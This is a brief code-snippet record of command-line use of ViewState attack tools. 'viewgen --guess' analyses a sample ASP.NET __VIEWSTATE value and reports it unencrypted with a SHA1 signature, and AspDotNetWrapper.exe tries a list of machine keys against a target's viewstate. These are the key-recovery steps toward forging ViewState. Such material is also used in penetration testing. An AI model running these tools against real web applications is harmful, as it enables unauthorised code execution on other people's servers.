---
id: aefe2b5b-c1ee-4841-83a3-95500b76f8b6
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:55:51.754194+00:00'
updated_at: '2023-04-10T20:21:10.234702+00:00'
---

# Code Snippet aefe2b5b

**Language**: Powershell

```powershell
# --webconfig WEBCONFIG: automatically load keys and algorithms from a web.config file
# -m MODIFIER, --modifier MODIFIER: VIEWSTATEGENERATOR value
$ viewgen --guess "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
[+] ViewState is not encrypted
[+] Signature algorithm: SHA1

# --encrypteddata : __VIEWSTATE parameter value of the target application
# --modifier : __VIEWSTATEGENERATOR parameter value
$ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> –macdecode
```


